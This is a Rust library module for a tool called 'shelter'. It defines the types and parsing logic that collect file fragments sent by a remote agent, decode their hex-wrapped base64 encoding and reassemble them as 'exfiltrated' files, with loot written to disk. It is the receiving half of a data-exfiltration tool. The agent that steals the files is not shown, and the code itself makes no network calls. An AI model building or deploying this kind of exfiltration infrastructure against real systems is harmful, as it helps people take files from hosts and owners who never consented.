#![doc = "Core types and helpers used by the `shelter` crate.\n\nThis module exposes the public command, error and event handler modules and\nprovides the typed representations for exfiltrated file portions and\nreconstructed files. It also contains the parsing logic that converts raw\npayload strings into structured `ExfiltratedFilePortion` instances.\n"]

/// Commands, used to expose CLI server subcommands.
pub mod commands;
/// Error definitions and conversions for application and HTTP layers.
pub mod error;
/// Event handler that consumes the processing queue and writes loot to disk.
pub mod event_handler;

use std::collections::BTreeMap;

use base64::Engine;

/// A single received portion of an exfiltrated file.
///
/// The remote agent sends files in discrete portions. Each portion carries:
/// - `file_name`: the name of the originating file.
/// - `index`: the sequential index of this portion within the file.
/// - `file_content`: the raw bytes payload (encoded as hex of base64 bytes).
/// - `is_last_portion`: whether this portion marks the end of the file.
#[derive(Clone, Debug)]
pub struct ExfiltratedFilePortion {
    pub file_name: String,
    pub index: usize,
    pub file_content: Vec<u8>,
    pub is_last_portion: bool,
}

/// A reconstructed exfiltrated file composed of ordered portions.
///
/// Portions are stored in a `BTreeMap` keyed by their `index` to ensure
/// deterministic ordering when reconstructing the final content.
#[derive(Clone, Debug)]
pub struct ExfiltratedFile {
    pub name: String,
    pub portions: BTreeMap<usize, Vec<u8>>,
}

impl ExfiltratedFile {
    /// Create a new, empty `ExfiltratedFile` with the given `name`.
    pub fn new(name: String) -> Self {
        Self {
            name,
            portions: BTreeMap::new(),
        }
    }

    /// Insert a received `ExfiltratedFilePortion` into the in-memory file map.
    ///
    /// If a portion with the same index already exists it will be overwritten.
    pub fn add_portion(&mut self, file_portion: ExfiltratedFilePortion) {
        self.portions
            .insert(file_portion.index, file_portion.file_content);
    }

    /// Reconstruct and return the full file contents as raw bytes.
    ///
    /// The stored portions are expected to contain hex-encoded bytes which
    /// are themselves base64-encoded chunks. This method:
    /// 1. Decodes each stored chunk from hex.
    /// 2. Decodes the resulting bytes from base64.
    /// 3. Concatenates all decoded chunks in order.
    ///
    /// Any chunk that fails decoding is silently skipped (only successfully
    /// decoded bytes are returned).
    pub fn get_file_contents(&self) -> Vec<u8> {
        self.portions
            .values()
            .filter_map(|chunk| hex::decode(chunk).ok())
            .filter_map(|b64_chunk| base64::prelude::BASE64_STANDARD.decode(b64_chunk).ok())
            .flatten()
            .collect()
    }
}

impl ExfiltratedFilePortion {
    /// Create a new `ExfiltratedFilePortion`.
    ///
    /// This is a simple constructor used to build portions programmatically.
    pub fn new(
        file_name: String,
        index: usize,
        file_content: Vec<u8>,
        is_last_portion: bool,
    ) -> Self {
        Self {
            file_content,
            index,
            file_name,
            is_last_portion,
        }
    }
}

/// Helper used when parsing payload bytes: returns a closure that filters out
/// a specific separator byte while iterating.
///
/// The returned closure is suitable for use with iterator adapters like
/// `map_while` to collect bytes until the separator is encountered.
fn is_not_payload_separator(separator: u8) -> impl Fn(u8) -> Option<u8> {
    move |byte| byte.ne(&separator).then_some(byte)
}

/// Parse a raw payload `String` into an `ExfiltratedFilePortion`.
///
/// The expected payload format (before transport encoding) is:
/// "<file_name>:<index>:<file_chunk>:<last_marker?>"
///
/// The function first decodes an outer hex encoding, then base64-decodes the
/// resulting bytes, and finally splits by ':' to extract fields. Errors from
/// decoding/parsing are converted into `crate::error::app::AppError`.
impl TryFrom<String> for ExfiltratedFilePortion {
    type Error = crate::error::app::AppError;

    fn try_from(value: String) -> Result<Self, Self::Error> {
        let mut payload_iter = base64::prelude::BASE64_STANDARD
            .decode(hex::decode(value)?)?
            .into_iter();

        let file_name = String::from_utf8(
            payload_iter
                .by_ref()
                .map_while(is_not_payload_separator(':' as u8))
                .collect::<Vec<u8>>(),
        )?;

        let index = String::from_utf8(
            payload_iter
                .by_ref()
                .map_while(is_not_payload_separator(':' as u8))
                .collect::<Vec<u8>>(),
        )?
        .parse::<usize>()?;

        let file_content = payload_iter
            .by_ref()
            .map_while(is_not_payload_separator(':' as u8))
            .collect::<Vec<u8>>();

        let last_payload = payload_iter
            .by_ref()
            .map_while(is_not_payload_separator(':' as u8))
            .collect::<Vec<u8>>();

        Ok(Self::new(
            file_name,
            index,
            file_content,
            !last_payload.is_empty(),
        ))
    }
}
